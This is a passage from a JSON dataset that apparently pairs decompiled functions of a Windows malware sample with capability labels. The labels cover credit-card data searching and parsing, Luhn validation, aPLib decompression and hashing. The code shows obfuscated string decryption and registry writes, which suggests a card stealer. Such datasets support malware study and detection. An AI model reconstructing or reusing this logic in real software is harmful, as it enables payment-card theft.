uVar7 - 1;\n                } while (uVar7 != 0);\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n            iVar2 = *0x4279d4;\n            iVar3 = fcn.00409a17(0x4279d0);\n            if (iVar3 == 0) {\n                if (iVar2 == 0) {\n                    return;\n                }\n                uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(uVar7, iVar2);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n                return;\n            }\n        }\n        (*_sym.imp.KERNEL32.dll_Sleep)(5000);\n        iVar5 = iVar5 + 1;\n        if (4 < iVar5) {\n            return;\n        }\n    } while( true );\n}\n",
        "token_count": 555
    },
    "0040f0a7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nulong __cdecl fcn.0040f0a7(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    uint32_t *puVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t var_2ch;\n    int32_t var_28h;\n    uint32_t var_24h;\n    int32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t dwSize;\n    \n    iVar2 = fcn.0040ef64(&var_24h, &dwSize);\n    var_28h = 0;\n    if ((iVar2 == 0) &&\n       (arg_8h_00 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, dwSize, 0x3000, 4),  iVar2 = var_20h,  iVar4 = dwSize, \n       uVar5 = var_24h,  var_10h = arg_8h_00,  arg_8h_00 != 0)) {\n        do {\n            var_1ch = uVar5;\n            var_18h = iVar2;\n            dwSize = arg_8h_00;\n            fcn.0040e34b(arg_8h_00, 0x1000);\n            iVar1 = var_10h;\n            arg_8h_00 = dwSize + 0x1000;\n            var_1ch = uVar5 + 0x1000;\n            var_18h = iVar2 + (0xffffefff < uVar5);\n            iVar4 = iVar4 + -0x1000;\n            iVar2 = var_18h;\n            uVar5 = var_1ch;\n        } while (iVar4 != 0);\n        dwSize = arg_8h_00;\n        puVar3 = fcn.0040d802(0x1000);\n        if (puVar3 == NULL) {\n            var_2ch = 0;\n        }\n        else {\n            var_2ch = *puVar3 + var_24h;\n            var_28h = var_20h + CARRY4(*puVar3, var_24h);\n        }\n        (*_sym.imp.KERNEL32.dll_VirtualFree)(iVar1, 0, 0x8000);\n    }\n    else {\n        var_2ch = 0;\n    }\n    return CONCAT44(var_28h, var_2ch);\n}\n",
        "token_count": 581
    },
    "0040385e": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0040385e(char *param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    uVar3 = 0xffffffff;\n    if (param_2 != 0) {\n        do {\n            uVar4 = *param_1;\n            param_2 = param_2 + -1;\n            param_1 = param_1 + 1;\n            iVar2 = 8;\n            do {\n                uVar1 = uVar4 ^ uVar3;\n                uVar3 = uVar3 >> 1;\n                if ((uVar1 & 1) != 0) {\n                    uVar3 = uVar3 ^ 0xedb88320;\n                }\n                uVar4 = uVar4 >> 1;\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        } while (param_2 != 0);\n    }\n    return uVar3;\n}\n",
        "token_count": 236
    },
    "0040392c": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040392c(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    int16_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    uint16_t uVar6;\n    uint32_t uVar7;\n    uint uVar8;\n    uint32_t uVar9;\n    int32_t *piVar10;\n    int32_t iVar11;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar11 = param_1 - *(param_1[0xf] + 0x34 + param_1);\n    iVar3 = *(param_1[0xf] + 0xa0 + param_1);\n    if (iVar3 == 0) {\ncode_r0x004039d5:\n        uVar8 = 0;\n    }\n    else {\n        piVar10 = iVar3 + param_1;\n        if (piVar10 != param_1) {\n            while( true ) {\n                iVar3 = piVar10[1];\n                if (iVar3 == 0) break;\n                iVar4 = *piVar10;\n                piVar5 = piVar10 + 2;\n                uVar7 = iVar3 - 8U >> 1;\n                while (uVar7 != 0) {\n                    uVar7 = uVar7 - 1;\n                    uVar9 = *piVar5;\n                    uVar6 = *piVar5 >> 0xc;\n                    if (uVar6 != 0) {\n                        if (uVar6 == 1) {\n                            piVar2 = param_1 + (uVar9 & 0xfff) + iVar4;\n                            *piVar2 = *piVar2 + (iVar11 >> 0x10);\n                        }\n                        else if (uVar6 == 2) {\n                            piVar2 = param_1 + (uVar9 & 0xfff) + iVar4;\n                            *piVar2 = *piVar2 + iVar11;\n                        }\n                        else {\n                            if ((uVar6 != 3) && (uVar6 != 10)) goto code_r0x004039d5;\n                            piVar1 = param_1 + (uVar9 & 0xfff) + iVar4;\n                            *piVar1 = *piVar1 + iVar11;\n                        }\n                    }\n                    piVar5 = piVar5 + 2;\n                }\n                piVar10 = piVar10 + piVar10[1];\n            }\n        }\n        uVar8 = 1;\n    }\n    return uVar8;\n}\n",
        "token_count": 579
    },
    "0040acc4": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nvoid fcn.0040acc4(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    do {\n        uVar1 = (*(uVar2 * 4 + 0x4262b4) ^ *(uVar2 * 4 + 0x4262b0)) & 0x7fffffff ^ *(uVar2 * 4 + 0x4262b0);\n        *(uVar2 * 4 + 0x4262b0) = uVar1 >> 1 ^ uVar1 & 1 ^ *(uVar2 * 4 + 0x4268e4);\n        uVar2 = uVar2 + 1;\n    } while (uVar2 < 0xe3);\n    for (; uVar2 < 0x26f; uVar2 = uVar2 + 1) {\n        uVar1 = (*(uVar2 * 4 + 0x4262b0) ^ *(uVar2 * 4 + 0x4262b4)) & 0x7fffffff ^ *(uVar2 * 4 + 0x4262b0);\n        *(uVar2 * 4 + 0x4262b0) = uVar1 >> 1 ^ *(uVar2 * 4 + 0x425f24) ^ uVar1 & 1;\n    }\n    *0x426c6c = (*0x4262b0 ^ *0x426c6c) & 0x7fffffff ^ *0x426c6c;\n    *0x426c6c = *0x426c6c >> 1 ^ *0x426c6c & 1 ^ *0x4268e0;\n    uVar2 = 0;\n    do {\n        uVar1 = *(uVar2 + 0x4262b0) ^ *(uVar2 + 0x4262b0) >> 0xb;\n        uVar1 = uVar1 ^ (uVar1 & 0xff3a58ad) << 7;\n        uVar1 = uVar1 ^ (uVar1 & 0xffffdf8c) << 0xf;\n        *(uVar2 + 0x426c70) = uVar1 >> 0x12 ^ uVar1;\n        uVar2 = uVar2 + 4;\n    } while (uVar2 < 0x9c0);\n    *0x427630 = 0;\n    return;\n}\n",
        "token_count": 557
    },
    "0040f8f7": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040f8f7(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    if ((arg_8h & 0x20006) == 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(0x80000001);\n    }\n    else {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegCreateKeyExW)(0x80000001);\n    }\n    uVar2 = 0;\n    if (iVar1 == 0) {\n        uVar2 = arg_8h;\n    }\n    return uVar2;\n}\n",
        "token_count": 153
    },
    "004122f4": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.004122f4(void)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    int32_t iVar6;\n    char cVar7;\n    char cVar8;\n    uint uVar9;\n    code *pcVar10;\n    uint32_t uVar11;\n    uint uVar12;\n    int32_t iVar13;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uchar var_34h;\n    uint var_30h;\n    uint32_t var_26h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint *lpLibFileName;\n    int32_t var_4h;\n    \n    var_14h = 0;\n    var_68h = 0xf01faf00;\n    var_64h = 0x505600;\n    var_60h = 0x8002700;\n    var_5ch = 0xc2900;\n    var_58h = 0x56900;\n    var_54h = 0x3ff00;\n    var_50h = 0x1c4200;\n    var_4ch = 0x163e00;\n    var_20h = 0x38122404;\n    var_1ch = 0x355a6266;\n    var_18h._0_3_ = 0x565e06;\n    var_10h = 0x6a517456;\n    var_ch._0_1_ = 0x32;\n    uVar9 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc);\n    lpLibFileName = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar9);\n    *lpLibFileName = 0;\n    lpLibFileName[1] = 0;\n    lpLibFileName[2] = 0;\n    iVar13 = 0;\n    var_4h = &var_20h - lpLibFileName;\n    do {\n        pcVar1 = iVar13 + lpLibFileName;\n        cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar2 = *(&var_10h + iVar13 % 5);\n        uVar3 = pcVar1[var_4h];\n        cVar8 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        iVar13 = iVar13 + 1;\n        *pcVar1 = cVar8 + ((uVar2 ^ uVar3) - cVar7);\n    } while (iVar13 < 0xb);\n    var_48h = 0x272b1f1a;\n    var_44h = 0xb2a0317;\n    var_40h = 0x14072636;\n    var_3ch = 0x2d271f3e;\n    var_38h._0_2_ = 0x1820;\n    var_38h._2_1_ = 0x2e;\n    var_38h._3_1_ = 6;\n    var_34h = 0x42;\n    var_1ch = 0x43426a4f;\n    var_18h._0_3_ = CONCAT12(var_18h._2_1_, 0x7154);\n    fcn.0040ac9b(lpLibFileName);\n    iVar13 = var_10h;\n    var_10h = &var_48h - var_10h;\n    var_4h = 0;\n    do {\n        iVar6 = var_4h;\n        pcVar1 = var_4h + iVar13;\n        cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar2 = *(&var_1ch + iVar6 % 6);\n        uVar3 = pcVar1[var_10h];\n        cVar8 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        puVar5 = lpLibFileName;\n        var_4h = var_4h + 1;\n        *pcVar1 = cVar8 + ((uVar2 ^ uVar3) - cVar7);\n    } while (var_4h < 0x15);\n    uVar9 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar13);\n    pcVar10 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar9);\n    if (pcVar10 == NULL) {\n        uVar9 = 0;\n    }\n    else {\n        (*pcVar10)(&var_30h);\n        uVar4 = var_26h;\n        var_26h = var_26h & 0xffffff;\n        uVar11 = 0;\n        uVar9 = var_14h;\n        do {\n            if (((uVar4 & 0xff0000) >> 8 | (var_26h << 0x10 | uVar4 & 0xff00) << 8) == (&var_68h)[uVar11]) {\n                uVar9 = 1;\n            }\n            uVar11 = uVar11 + 1;\n        } while (uVar11 < 8);\n    }\n    pcVar10 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar12 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar13);\n    (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar12);\n    uVar12 = (*pcVar10)(0, puVar5);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar12);\n    return uVar9;\n}\n",
        "token_count": 1357
    },
    "00408eb9": {
        "rules": [
            "search for credit card data/212a26c2b8d740cd9f6579dba482d653",
            "parse credit card information/92c3fd9898ba41b4bad3ffb6188f4688"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00408eb9(int16_t *param_1)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    int16_t iVar4;\n    code *pcVar5;\n    uint *puVar6;\n    char cVar7;\n    char cVar8;\n    uint uVar9;\n    int16_t *piVar10;\n    int32_t iVar11;\n    uint32_t uVar12;\n    int16_t *piVar13;\n    int32_t iVar14;\n    code *pcVar15;\n    uint *puVar16;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    int16_t *var_a8h;\n    uint *var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uchar var_41h;\n    int32_t var_40h;\n    uint *var_3ch;\n    int32_t hKey;\n    uint *lpValueName;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uchar var_14h;\n    uchar var_13h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ach = 1;\n    var_30h = 0x350f6211;\n    var_2ch = 0x62347825;\n    var_28h = 0x782f351f;\n    var_24h = 0x35236221;\n    var_20h = 0x6226782d;\n    var_1ch = 0x7822351e;\n    var_18h._0_1_ = 0x39;\n    var_18h._1_1_ = 0x62;\n    var_18h._2_1_ = 6;\n    var_18h._3_1_ = 0x35;\n    var_14h = 0x43;\n    var_13h = 0x78;\n    var_8h = 0x356a6255;\n    var_4h._0_2_ = 0x7843;\n    uVar9 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x3d);\n    piVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar9);\n    uVar12 = 0;\n    do {\n        *(piVar10 + uVar12) = *(piVar10 + uVar12) * ')';\n        uVar12 = uVar12 + 1;\n    } while (uVar12 < 0x3d);\n    var_a8h = piVar10;\n    sub.ntdll.dll_memset(piVar10, 0, 0x3d);\n    var_40h = 0;\n    var_3ch = &var_30h - piVar10;\n    do {\n        iVar11 = var_40h;\n        pcVar1 = piVar10 + var_40h;\n        cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar2 = *(&var_8h + iVar11 % 6);\n        uVar3 = pcVar1[var_3ch];\n        cVar8 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        var_40h = var_40h + 1;\n        *pcVar1 = cVar8 + ((uVar2 ^ uVar3) - cVar7);\n    } while (var_40h < 0x1e);\n    var_a0h = 0x53586e1a;\n    var_9ch = 0x371a4901;\n    var_98h = 0x6e286724;\n    var_94h = 0x49025345;\n    var_90h = 0x671e3732;\n    var_8ch = 0x53546e20;\n    var_88h = 0x37014915;\n    var_84h = 0x6e266720;\n    var_80h = 0x49135351;\n    var_7ch = 0x671a3732;\n    var_78h = 0x53766e0c;\n    var_74h = 0x3732492c;\n    var_70h = 0x6e3b6714;\n    var_6ch = 0x49125358;\n    var_68h = 0x6703371e;\n    var_64h = 0x535b6e26;\n    var_60h = 0x370d490e;\n    var_5ch = 0x6e15672a;\n    var_58h = 0x49025367;\n    var_54h = 0x67373700;\n    var_50h = 0x53596e20;\n    var_4ch = 0x37294900;\n    var_48h._0_2_ = 0x6703;\n    var_48h._2_1_ = 6;\n    stack0xffffffb7 = 0x6753446e;\n    var_41h = 0x49;\n    var_10h = 0x53376e49;\n    var_ch._0_1_ = 0x67;\n    uVar9 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc1);\n    iVar11 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar9);\n    uVar12 = 0;\n    do {\n        *(iVar11 + uVar12) = *(iVar11 + uVar12) + 'a';\n        uVar12 = uVar12 + 1;\n    } while (uVar12 < 0xc1);\n    var_40h = iVar11;\n    sub.ntdll.dll_memset(iVar11, 0, 0xc1);\n    hKey = 0;\n    iVar14 = iVar11;\n    var_3ch = &var_a0h - iVar11;\n    do {\n        pcVar1 = iVar14 + hKey;\n        cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar2 = *(&var_10h + hKey % 5);\n        uVar3 = *((&var_a0h - iVar11) + pcVar1);\n        cVar8 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        iVar14 = var_40h;\n        hKey = hKey + 1;\n        *pcVar1 = cVar8 + ((uVar2 ^ uVar3) - cVar7);\n    } while (hKey < 0x60);\n    hKey = fcn.0040f8f7(0xf003f);\n    pcVar15 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    piVar10 = var_a8h;\n    if (hKey != 0) {\n        var_20h = 0x50154610;\n        var_1ch = 0x463d5005;\n        var_18h._0_1_ = 0xe;\n        var_18h._1_1_ = 0x50;\n        var_18h._2_1_ = 0x70;\n        var_18h._3_1_ = 0x50;\n        var_8h = 0x507a4653;\n        var_4h._0_2_ = 0x5070;\n        uVar9 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n        var_a4h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar9);\n        uVar12 = 0;\n        do {\n            *(var_a4h + uVar12) = *(var_a4h + uVar12) ^ 0x41;\n            uVar12 = uVar12 + 1;\n        } while (uVar12 < 0x19);\n        lpValueName = NULL;\n        puVar16 = var_a4h;\n        for (iVar11 = 6; iVar11 != 0; iVar11 = iVar11 + -1) {\n            *puVar16 = 0;\n            puVar16 = puVar16 + 1;\n        }\n        *puVar16 = 0;\n        iVar11 = &var_20h - var_a4h;\n        do {\n            iVar14 = lpValueName;\n            pcVar1 = var_a4h + lpValueName;\n            cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar2 = *(&var_8h + iVar14 % 6);\n            uVar3 = pcVar1[iVar11];\n            cVar8 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            lpValueName = lpValueName + 1;\n            *pcVar1 = cVar8 + ((uVar2 ^ uVar3) - cVar7);\n        } while (lpValueName < 0xc);\n        var_20h = 0x66296a62;\n        var_1ch = 0x48023205;\n        var_18h._0_1_ = 0x57;\n        var_18h._1_1_ = 0x71;\n        var_18h._2_1_ = 0x32;\n        var_18h._3_1_ = 0x6a;\n        var_10h = 0x66486a32;\n        var_ch._0_1_ = 0x71;\n        uVar9 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n        var_3ch = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar9);\n        uVar12 = 0;\n        do {\n            *(var_3ch + uVar12) = *(var_3ch + uVar12) ^ 0xbe;\n            uVar12 = uVar12 + 1;\n        } while (uVar12 < 0x19);\n        lpValueName = NULL;\n        puVar16 = var_3ch;\n        for (iVar11 = 6; iVar11 != 0; iVar11 = iVar11 + -1) {\n            *puVar16 = 0;\n            puVar16 = puVar16 + 1;\n        }\n        *puVar16 = 0;\n        iVar11 = &var_20h - var_3ch;\n        do {\n            iVar14 = lpValueName;\n            pcVar1 = var_3ch + lpValueName;\n            cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar2 = *(&var_10h + iVar14 % 5);\n            uVar3 = pcVar1[iVar11];\n            cVar8 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            lpValueName = lpValueName + 1;\n            *pcVar1 = cVar8 + ((uVar2 ^ uVar3) - cVar7);\n        } while (lpValueName < 0xc);\n        var_24h = 0x69016703;\n        var_20h = 0x64135029;\n        var_1ch = 0x673f4a00;\n        var_18h._0_1_ = 10;\n        var_18h._1_1_ = 0x69;\n        var_18h._2_1_ = 0x7b;\n        var_18h._3_1_ = 0x50;\n        var_14h = 0x67;\n        var_13h = 100;\n        var_8h = 0x69646750;\n        var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x4a);\n        uVar9 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x25);\n        lpValueName = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar9);\n        uVar12 = 0;\n        do {\n            *(lpValueName + uVar12) = *(lpValueName + uVar12) * -0x6c;\n            uVar12 = uVar12 + 1;\n        } while (uVar12 < 0x25);\n        puVar16 = lpValueName;\n        for (iVar11 = 9; iVar11 != 0; iVar11 = iVar11 + -1) {\n            *puVar16 = 0;\n            puVar16 = puVar16 + 1;\n        }\n        *puVar16 = 0;\n        iVar11 = 0;\n        var_10h = &var_24h - lpValueName;\n        do {\n            pcVar1 = lpValueName + iVar11;\n            cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar2 = *(&var_8h + iVar11 % 5);\n            uVar3 = pcVar1[var_10h];\n            cVar8 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            iVar14 = hKey;\n            iVar11 = iVar11 + 1;\n            *pcVar1 = cVar8 + ((uVar2 ^ uVar3) - cVar7);\n            pcVar15 = _sym.imp.ADVAPI32.dll_RegSetValueExW;\n        } while (iVar11 < 0x12);\n        (*_sym.imp.ADVAPI32.dll_RegSetValueExW)(hKey, var_a4h, 0, 4, &var_ach, 4);\n        puVar16 = var_3ch;\n        piVar10 = param_1;\n        do {\n            iVar4 = *piVar10;\n            piVar10 = piVar10 + 1;\n        } while (iVar4 != 0);\n        (*pcVar15)(iVar14, var_3ch, 0, 1, param_1, (piVar10 - (param_1 + 1) >> 1) * 2);\n        puVar6 = lpValueName;\n        piVar10 = var_a8h;\n        piVar13 = var_a8h;\n        do {\n            iVar4 = *piVar13;\n            piVar13 = piVar13 + 1;\n        } while (iVar4 != 0);\n        (*_sym.imp.ADVAPI32.dll_RegSetValueExW)(hKey, lpValueName, 0, 1, var_a8h, (piVar13 - (var_a8h + 1) >> 1) * 2);\n        fcn.0040f7cd();\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n        uVar12 = 0;\n        do {\n            pcVar1 = puVar6 + uVar12;\n            *pcVar1 = *pcVar1 + -0x58;\n            pcVar15 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            uVar12 = uVar12 + 1;\n        } while (uVar12 < 0x25);\n        uVar9 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar6);\n        (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar9);\n        uVar12 = 0;\n        do {\n            pcVar1 = puVar16 + uVar12;\n            *pcVar1 = *pcVar1 + -0x59;\n            uVar12 = uVar12 + 1;\n        } while (uVar12 < 0x19);\n        uVar9 = (*pcVar15)(0, puVar16);\n        (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar9);\n        uVar12 = 0;\n        do {\n            *(var_a4h + uVar12) = *(var_a4h + uVar12) ^ 0x6a;\n            uVar12 = uVar12 + 1;\n        } while (uVar12 < 0x19);\n        uVar9 = (*pcVar15)(0, var_a4h);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar9);\n        iVar14 = var_40h;\n    }\n    uVar12 = 0;\n    do {\n        *(iVar14 + uVar12) = *(iVar14 + uVar12) + -0x3b;\n        uVar12 = uVar12 + 1;\n    } while (uVar12 < 0xc1);\n    uVar9 = (*pcVar15)(0, iVar14);\n    pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar9);\n    uVar12 = 0;\n    do {\n        *(piVar10 + uVar12) = *(piVar10 + uVar12) + '\\\"';\n        uVar12 = uVar12 + 1;\n    } while (uVar12 < 0x3d);\n    uVar9 = (*pcVar15)(0, piVar10);\n    (*pcVar5)(uVar9);\n    return 1;\n}\n",
        "token_count": 3954
    },
    "0040cdeb": {
        "rules": [
            "search for credit card data/212a26c2b8d740cd9f6579dba482d653",
            "parse credit card information/92c3fd9898ba41b4bad3ffb6188f4688"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040cdeb(void)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    code *pcVar4;\n    uint *puVar5;\n    int32_t iVar6;\n    char cVar7;\n    char cVar8;\n    uint uVar9;\n    uint *puVar10;\n    code *pcVar11;\n    int32_t iVar12;\n    uint32_t uVar13;\n    uint lpDst;\n    uint lpszShortPath;\n    uint ARG_0;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint *var_90h;\n    uint *var_8ch;\n    uint *var_88h;\n    uint var_80h;\n    uint hObject;\n    uint var_60h;\n    int32_t lpSrc;\n    int32_t var_58h;\n    int32_t var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint *lpLibFileName;\n    uint *var_14h;\n    int32_t lpszLongPath;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    lpszLongPath = *0x4279dc;\n    var_4ch = 0x43077a71;\n    var_48h = 0x7a3a5127;\n    puVar10 = &lpDst;\n    for (iVar12 = 0x410; iVar12 != 0; iVar12 = iVar12 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    var_44h = 0x51274314;\n    var_40h = 0x43557a26;\n    puVar10 = &ARG_0;\n    for (iVar12 = 0x208; iVar12 != 0; iVar12 = iVar12 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    var_3ch = 0x7a275112;\n    var_38h = 0x513d4309;\n    puVar10 = &ARG_0;\n    for (iVar12 = 0x208; iVar12 != 0; iVar12 = iVar12 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    var_34h = 0x43157a20;\n    var_30h = 0x7a675123;\n    puVar10 = &lpszShortPath;\n    for (iVar12 = 0x208; iVar12 != 0; iVar12 = iVar12 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    var_2ch = 0x51124342;\n    var_28h = 0x431d7a37;\n    var_24h = 0x7a7a512a;\n    var_20h = 0x51364315;\n    var_1ch = 0x43707a31;\n    var_8h = 0x43707a54;\n    var_4h = CONCAT22(var_4h._2_2_, 0x514e);\n    fcn.0040a16d(0);\n    pcVar11 = _sym.imp.KERNEL32.dll_GetLastError;\n    lpLibFileName = &var_4ch - lpSrc;\n    var_14h = NULL;\n    do {\n        iVar12 = var_14h;\n        pcVar1 = lpSrc + var_14h;\n        cVar7 = (*pcVar11)();\n        uVar2 = *(&var_8h + iVar12 % 6);\n        uVar3 = pcVar1[lpLibFileName];\n        cVar8 = (*pcVar11)();\n        var_14h = var_14h + 1;\n        *pcVar1 = cVar8 + ((uVar2 ^ uVar3) - cVar7);\n    } while (var_14h < 0x34);\n    (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(lpSrc, &lpDst, 0x104);\n    (*_sym.imp.KERNEL32.dll_GetShortPathNameW)(lpszLongPath, &lpszShortPath, 0x104);\n    var_38h = 0x6d417561;\n    var_34h = 0x75614334;\n    var_30h = 0x43246d4c;\n    var_2ch = 0x6d0f7535;\n    var_28h = 0x75354325;\n    var_24h = 0x43726d4e;\n    var_20h = 0x6d4c7532;\n    var_1ch = CONCAT22(var_1ch._2_2_, 0x4357);\n    var_8h = 0x6d6e7541;\n    var_4h = CONCAT22(var_4h._2_2_, 0x4357);\n    uVar9 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x3d);\n    iVar12 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar9);\n    uVar13 = 0;\n    do {\n        *(iVar12 + uVar13) = *(iVar12 + uVar13) * -0x18;\n        uVar13 = uVar13 + 1;\n    } while (uVar13 < 0x3d);\n    var_58h = iVar12;\n    sub.ntdll.dll_memset(iVar12, 0, 0x3d);\n    var_14h = NULL;\n    lpLibFileName = &var_38h - iVar12;\n    do {\n        iVar6 = var_14h;\n        pcVar1 = iVar12 + var_14h;\n        cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar2 = *(&var_8h + iVar6 % 6);\n        uVar3 = pcVar1[lpLibFileName];\n        cVar8 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        var_14h = var_14h + 1;\n        *pcVar1 = cVar8 + ((uVar2 ^ uVar3) - cVar7);\n    } while (var_14h < 0x1e);\n    (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, iVar12, &lpszShortPath);\n    var_ch = 0x683e5320;\n    var_8h = 0x4b32520a;\n    var_4h = 0x5352641b;\n    var_54h = 0x684b5352;\n    puVar10 = &var_9ch;\n    for (iVar12 = 0x3c; iVar12 != 0; iVar12 = iVar12 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    var_50h._0_1_ = 100;\n    uVar9 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n    var_14h 